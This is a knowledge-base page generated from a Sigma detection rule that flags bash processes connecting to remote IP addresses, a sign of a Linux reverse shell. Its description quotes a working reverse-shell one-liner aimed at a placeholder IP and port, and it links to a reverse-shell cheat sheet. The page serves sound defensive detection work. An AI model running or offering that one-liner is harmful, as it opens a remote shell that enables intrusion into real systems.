---
sigma_id: "83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871"
title: "Linux Reverse Shell Indicator"
framework: "sigma"
generated: "true"
source_path: "rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"
source_url: "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"
build_date: "2026-04-26 15:01:46"
status: "test"
level: "critical"
logsource: "linux / network_connection"
aliases:
  - "83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871"
  - "Linux Reverse Shell Indicator"
attack_technique_ids:
  - "T1059.004"
tags:
  - "sigma"
  - "detection-rule"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Linux Reverse Shell Indicator

Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

## Metadata

- Rule ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
- Status: test
- Level: critical
- Author: Florian Roth (Nextron Systems)
- Date: 2021-10-16
- Modified: 2022-12-25
- Source Path: rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml

## Logsource

- category: network_connection
- product: linux

## ATT&CK Mapping

### Techniques

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.004]]

## Detection

```yaml
selection:
  Image|endswith: /bin/bash
filter:
  DestinationIp:
  - 127.0.0.1
  - 0.0.0.0
condition: selection and not filter
```

## False Positives

- Unknown

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Source

- [Source YAML](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml)
